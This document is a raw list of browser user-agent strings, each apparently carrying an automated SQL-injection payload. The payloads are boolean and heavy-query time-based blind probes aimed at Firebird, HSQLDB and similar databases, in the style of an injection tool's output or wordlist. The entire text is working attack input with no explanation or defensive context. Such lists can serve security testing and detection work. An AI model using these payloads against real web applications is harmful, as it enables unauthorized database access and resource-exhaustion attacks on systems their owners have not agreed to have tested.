Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS gvCR WHERE 1295=1295 OR 2697=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)-- TtwA
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AS Jrpk WHERE 9675=9675 OR 2697=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)-- xmcy
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') WHERE 6777=6777 AND 6411=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT Vyrs WHERE 6003=6003 AND 6411=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS Ipbs WHERE 5620=5620 AND 6411=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17`) WHERE 3582=3582 AND 6411=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') WHERE 3654=3654 OR 2652=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 WHERE 2278=2278 OR 2652=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS DMyF WHERE 4637=4637 OR 2652=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AS RnXz WHERE 1542=1542 OR 2652=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AS pDaT WHERE 5804=5804 OR 2652=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 8551=8551 OR 2652=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE) OR 2652=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND 'Qcrf'='Qcrf
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND ((('ydUf' LIKE 'ydUf
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND 'CiwX' LIKE 'CiwX
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND \x22pwEd\x22=\x22pwEd
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND (\x22qeqp\x22 LIKE \x22qeqp
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))) AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND (((\x22FqHK\x22 LIKE \x22FqHK
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND \x22lMYg\x22 LIKE \x22lMYg
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' WHERE 2186=2186 AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- ScgS
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 WHERE 8488=8488 AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- EboA
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT ddNz FROM DUAL WHERE 1736=1736 AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3))||'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT obMV FROM DUAL WHERE 7418=7418 AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3))||
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 3287=3287 AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- EcPI
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- RaJI
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND ('QxPw'='QxPw
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND ('IdHR' LIKE 'IdHR
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND (('szAc' LIKE 'szAc
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND ((('KcNV' LIKE 'KcNV
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' WHERE 8529=8529 OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- epmH
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT gWlp FROM DUAL WHERE 9174=9174 OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3))||'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT DAgG FROM DUAL WHERE 6000=6000 OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3))||
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS jVkR WHERE 4169=4169 OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- uDjg
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 8050=8050 OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- eStA
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) WHERE 7795=7795 AND 8539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 WHERE 1977=1977 AND 8539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS DJKW WHERE 5135=5135 AND 8539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS OOCy WHERE 6550=6550 AND 8539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 6954=6954 AND 8539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17`) WHERE 9595=9595 AND 8539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) WHERE 7135=7135 OR 8998=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' WHERE 5130=5130 OR 8998=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 WHERE 8485=8485 OR 8998=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT QGme WHERE 5689=5689 OR 8998=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'+(SELECT jucn WHERE 9545=9545 OR 8998=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT ClAT FROM DUAL WHERE 6633=6633 OR 8998=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT dkRh WHERE 2732=2732 OR 8998=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AS flWo WHERE 8487=8487 OR 8998=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AS ksmo WHERE 6383=6383 OR 8998=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17`) WHERE 7906=7906 OR 8998=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL)-- jeGH
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL) AND ((8532=8532
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL) AND ('aGPu'='aGPu
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL) AND ((('zTfi' LIKE 'zTfi
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL)# tZvf
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) WHERE 5949=5949 AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL)-- akzJ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT CHAR(113)||CHAR(74)||CHAR(114)||CHAR(109) FROM DUAL WHERE 5471=5471 AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL))||'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT CHAR(103)||CHAR(121)||CHAR(68)||CHAR(98) WHERE 5110=5110 AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL))||
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS eCzu WHERE 9570=9570 AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL)-- LNpn
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AS BKhv WHERE 7003=7003 AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL)-- vGDF
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE) AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL)#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL)-- Mruk
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL)-- zqfl
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL) AND (2342=2342
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL) AND ((8504=8504
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17))) OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL) AND (((5370=5370
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL) AND ('Wrwl'='Wrwl
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL) AND (('Jjqu'='Jjqu
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL) AND ('hbFx' LIKE 'hbFx
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL) AND (\x22vINf\x22=\x22vINf
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL) AND \x22ucpF\x22=\x22ucpF
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') WHERE 6792=6792 OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL)-- MfmA
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT CHAR(79)||CHAR(101)||CHAR(88)||CHAR(118) WHERE 7826=7826 OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL))||
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AS sEGZ WHERE 6579=6579 OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL)-- TcHL
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS tBke WHERE 3613=3613 OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL)-- oNqX
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 3680=3680 OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL)-- zQPG
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE) OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL)#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT CHAR(86)||CHAR(119)||CHAR(118)||CHAR(71) FROM DUAL WHERE 7628=7628 AND CHAR(117)||CHAR(108)||CHAR(106)||CHAR(81)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8765),0),32000000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS AgLs WHERE 1337=1337 AND CHAR(117)||CHAR(108)||CHAR(106)||CHAR(81)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8765),0),32000000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AS ugrm WHERE 2008=2008 AND CHAR(117)||CHAR(108)||CHAR(106)||CHAR(81)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8765),0),32000000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT CHAR(108)||CHAR(112)||CHAR(108)||CHAR(81) WHERE 2351=2351 OR CHAR(68)||CHAR(110)||CHAR(109)||CHAR(79)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4222),0),32000000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AS IzHz WHERE 8481=8481 OR CHAR(68)||CHAR(110)||CHAR(109)||CHAR(79)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4222),0),32000000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- UbSW
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND ((('yJOs'='yJOs
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND ('nNgQ' LIKE 'nNgQ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND ((('qQQb' LIKE 'qQQb
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17%' AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND 'zEvw%'='zEvw
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND ((\x22nPSE\x22=\x22nPSE
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))) AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND (((\x22JmrN\x22=\x22JmrN
